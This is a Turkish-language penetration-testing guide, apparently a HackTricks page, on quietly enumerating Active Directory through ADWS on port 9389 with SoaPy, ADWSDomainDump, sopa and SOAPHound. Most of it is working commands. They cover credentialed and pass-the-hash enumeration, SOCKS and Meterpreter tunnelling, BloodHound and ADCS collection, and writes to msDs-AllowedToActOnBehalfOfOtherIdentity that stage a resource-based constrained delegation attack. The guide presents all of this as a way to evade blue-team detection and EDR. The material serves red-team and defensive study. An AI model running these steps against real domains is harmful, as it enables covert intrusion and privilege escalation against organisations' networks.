# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS Nedir?

Active Directory Web Services (ADWS), **Windows Server 2008 R2'den beri her Domain Controller'da varsayılan olarak etkinleştirilmiştir** ve TCP **9389** üzerinden dinler. İsimden beklenebileceği gibi, **HTTP kullanılmaz**. Bunun yerine servis, LDAP tarzı verileri özel .NET framing protokollerinden oluşan bir yığın üzerinden açığa çıkarır:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Bu trafik ikili SOAP frame'leri içinde kapsüllenmiş olduğu ve nadir kullanılan bir port üzerinden gittiği için, **ADWS üzerinden yapılan enumeration, klasik LDAP/389 & 636 trafiğine göre incelenme, filtrelenme veya imzalanma olasılığı çok daha düşüktür**. Operatörler için bunun anlamı:

* Daha gizli keşif – Blue teams genellikle LDAP sorgularına odaklanır.
* 9389/TCP'yi bir SOCKS proxy üzerinden tünelleyerek **non-Windows hosts (Linux, macOS)**'lardan veri toplama özgürlüğü.
* LDAP ile elde edeceğiniz aynı veriler (users, groups, ACLs, schema vb.) ve **writes** yapabilme kabiliyeti (ör. `msDs-AllowedToActOnBehalfOfOtherIdentity` ile **RBCD**).

ADWS etkileşimleri WS-Enumeration üzerinden gerçekleştirilir: her sorgu LDAP filtre/özniteliklerini tanımlayan ve bir `EnumerationContext` GUID döndüren bir `Enumerate` mesajı ile başlar, bunu sunucu tarafından tanımlanan sonuç penceresine kadar akış yapan bir veya daha fazla `Pull` mesajı izler. Context'ler yaklaşık ~30 dakika sonra zaman aşımına uğrar, bu yüzden araçlar ya sonuçları sayfalamalı ya da durumu kaybetmemek için filtreleri bölmelidir (her CN için önek sorguları). Güvenlik descriptor'ları istendiğinde SACL'leri dışlamak için `LDAP_SERVER_SD_FLAGS_OID` kontrolünü belirtin; aksi takdirde ADWS SOAP yanıtından `nTSecurityDescriptor` özniteliğini basitçe çıkarır.

> NOTE: ADWS birçok RSAT GUI/PowerShell aracı tarafından da kullanıldığından, trafik meşru yönetici aktiviteleriyle karışabilir.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) saf Python ile ADWS protokol yığınının **tam yeniden-uygulamasıdır**. NBFX/NBFSE/NNS/NMF frame'lerini byte-by-byte oluşturur ve .NET runtime'a dokunmadan Unix-benzeri sistemlerden veri toplanmasına imkan tanır.

### Temel Özellikler

* SOCKS üzerinden **proxyleme** desteği (C2 implant'larından kullanışlı).
* LDAP `-q '(objectClass=user)'` ile özdeş ince taneli arama filtreleri.
* İsteğe bağlı **write** işlemleri (`--set` / `--delete`).
* BloodHound'a doğrudan aktarım için **BOFHound output mode**.
* İnsan okunabilirlik gerektiğinde zaman damgalarını / `userAccountControl`'ü güzelleştirmek için `--parse` bayrağı.

### Hedefe yönelik toplama bayrakları & yazma işlemleri

SoaPy, ADWS üzerinden en yaygın LDAP avcılık görevlerini çoğaltan özenle seçilmiş anahtarlarla gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, ayrıca özel çekimler için ham `--query` / `--filter` ayarları. Bunları `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (hedefli Kerberoasting için SPN hazırlama) ve `--asrep` (`userAccountControl` içinde `DONT_REQ_PREAUTH`'ı tersine çevirme) gibi yazma ilkelikleri ile eşleştirin.

Örnek olarak sadece `samAccountName` ve `servicePrincipalName` döndüren hedefe yönelik SPN araması:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Kullanılan aynı host/credentials ile bulguları hemen weaponise etmek için: RBCD-capable nesneleri dump etmek için `--rbcds` kullanın; ardından Resource-Based Constrained Delegation zincirini stage etmek için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam kötüye kullanım yolu için bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Kurulum (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump ADWS üzerinden (Linux/Windows)

* `ldapdomaindump`'un bir fork'u; LDAP sorgularını TCP/9389 üzerinden ADWS çağrılarına çevirerek LDAP-imza tespitlerini azaltır.
* `--force` verilmedikçe 9389'a ilk erişilebilirlik kontrolü yapar (port taramaları gürültülü/filtreliyse probe'ı atlar).
* Microsoft Defender for Endpoint ve CrowdStrike Falcon üzerinde test edildi; README'de başarılı bir bypass gösteriliyor.

### Kurulum
```bash
pipx install .
```
### Kullanım
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipik çıktı, 9389 reachability check, ADWS bind ve dump start/finish kayıtlarını içerir:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Golang ile ADWS için pratik bir istemci

soapy ile benzer şekilde, [sopa](https://github.com/Macmod/sopa) ADWS protokol yığını (MS-NNS + MC-NMF + SOAP) uyguluyor ve aşağıdaki gibi ADWS çağrıları yapmak için komut satırı seçenekleri sağlıyor:

* **Nesne arama ve alma** - `query` / `get`
* **Nesne yaşam döngüsü** - `create [user|computer|group|ou|container|custom]` ve `delete`
* **Öznitelik düzenleme** - `attr [add|replace|delete]`
* **Hesap yönetimi** - `set-password` / `change-password`
* ve `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` gibi diğerleri.

### Protokol eşlemesi - öne çıkanlar

* LDAP-style aramalar, öznitelik projeksiyonu, kapsam kontrolü (Base/OneLevel/Subtree) ve sayfalama ile **WS-Enumeration** (`Enumerate` + `Pull`) aracılığıyla yapılır.
* Tek nesne alımı **WS-Transfer** `Get` kullanır; öznitelik değişiklikleri `Put`; silmeler `Delete` kullanır.
* Yerleşik nesne oluşturma **WS-Transfer ResourceFactory** kullanır; özel nesneler YAML şablonları tarafından yönlendirilen bir **IMDA AddRequest** kullanır.
* Şifre işlemleri **MS-ADCAP** eylemleridir (`SetPassword`, `ChangePassword`).

### Kimlik doğrulama olmadan meta veri keşfi (mex)

ADWS, kimlik bilgisi olmadan WS-MetadataExchange'i açığa çıkarır; bu, kimlik doğrulamadan önce maruziyeti doğrulamanın hızlı bir yoludur:
```bash
sopa mex --dc <DC>
```
### DNS/DC keşfi & Kerberos hedefleme notları

Sopa, `--dc` belirtilmediğinde ve `--domain` sağlandığında DC'leri SRV aracılığıyla çözümleyebilir. Aşağıdaki sırayla sorgular ve en yüksek öncelikli hedefi kullanır:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operasyonel olarak, segmentlenmiş ortamlardaki hatalardan kaçınmak için DC tarafından kontrol edilen bir resolver'ı tercih edin:

* `--dns <DC-IP>` kullanın, böylece **tüm** SRV/PTR/forward aramaları DC DNS üzerinden gerçekleştirilir.
* UDP engellendiğinde veya SRV cevapları büyük olduğunda `--dns-tcp` kullanın.
* Kerberos etkinse ve `--dc` bir IP ise, sopa doğru SPN/KDC hedeflemesi için bir **reverse PTR** gerçekleştirerek bir FQDN elde eder. Kerberos kullanılmıyorsa PTR araması yapılmaz.

Örnek (IP + Kerberos, DNS'in DC aracılığıyla zorlanması):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Kimlik doğrulama seçenekleri

Düz metin parolaların yanı sıra, sopa ADWS auth için **NT hashes**, **Kerberos AES keys**, **ccache** ve **PKINIT certificates** (PFX or PEM) destekler. Kerberos, `--aes-key`, `-c` (ccache) veya sertifika tabanlı seçenekler kullanıldığında varsayılır.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Şablonlar aracılığıyla özel nesne oluşturma

İstediğiniz nesne sınıfları için, `create custom` komutu IMDA `AddRequest` ile eşlenen bir YAML şablonunu kullanır:

* `parentDN` ve `rdn` konteyneri ve göreli DN'yi tanımlar.
* `attributes[].name` `cn` veya isim alanlı `addata:cn` destekler.
* `attributes[].type` `string|int|bool|base64|hex` veya açık `xsd:*` kabul eder.
* `ad:relativeDistinguishedName` veya `ad:container-hierarchy-parent` eklemeyin; sopa bunları enjekte eder.
* `hex` değerleri `xsd:base64Binary`'e dönüştürülür; boş string ayarlamak için `value: ""` kullanın.

## SOAPHound – Yüksek Hacimli ADWS Toplama (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ADWS içinde tüm LDAP etkileşimlerini tutan ve BloodHound v4-uyumlu JSON üreten bir .NET toplayıcıdır. Bir kez `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass`'ın tam önbelleğini oluşturur (`--buildcache`), sonra yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD ile entegre DNS) işlemlerinde tekrar kullanır; böylece DC'den yalnızca ~35 kritik öznitelik çıkar. AutoSplit (`--autosplit --threshold <N>`) sorguları CN önekine göre otomatik olarak parçalara böler ve büyük ormanlarda 30 dakikalık EnumerationContext zaman aşımının altında kalmayı sağlar.

Tipik iş akışı, etki alanına dahil bir operatör VM'sinde:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Export edilmiş JSON slotları doğrudan SharpHound/BloodHound iş akışlarına eklendi — sonraki görselleştirme fikirleri için [BloodHound methodology](bloodhound.md) bakın. AutoSplit, SOAPHound'u milyonlarca nesneli ormanlarda dayanıklı kılar ve sorgu sayısını ADExplorer tarzı snapshot'lardan daha düşük tutar.

## Gizli AD Toplama İş Akışı

Aşağıdaki iş akışı, ADWS üzerinden **etki alanı & ADCS nesnelerini** nasıl listeleyeceğinizi, bunları BloodHound JSON'a dönüştüreceğinizi ve sertifika tabanlı saldırı yollarını nasıl arayacağınızı gösterir — tümü Linux'tan:

1. **9389/TCP tünelleyin** hedef ağdan kendi makinenize (ör. Chisel, Meterpreter, SSH dynamic port-forward, vb.). `export HTTPS_PROXY=socks5://127.0.0.1:1080` komutunu çalıştırın veya SoaPy’nin `--proxyHost/--proxyPort` seçeneğini kullanın.

2. **Kök etki alanı nesnesini toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC'den ADCS ile ilişkili nesneleri topla:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP'i BloodHound GUI'ye yükleyin** ve `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırarak sertifika yükseltme yollarını (ESC1, ESC8, vb.) ortaya çıkarın.

### Yazma `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Bunu tam bir **Resource-Based Constrained Delegation** zinciri için `s4u2proxy`/`Rubeus /getticket` ile birleştirin (bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS keşfi | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, okuma/yazma |
| Yüksek hacimli ADWS dökümü | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modları |
| BloodHound içe aktarma | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch loglarını dönüştürür |
| Sertifika ele geçirme | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden proxy aracılığıyla kullanılabilir |
| ADWS keşfi ve nesne değişiklikleri | [sopa](https://github.com/Macmod/sopa) | Bilinen ADWS uç noktalarıyla etkileşim kurmak için genel bir istemci - keşif, nesne oluşturma, öznitelik değişiklikleri ve parola değişikliklerine izin verir |

## Referanslar

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
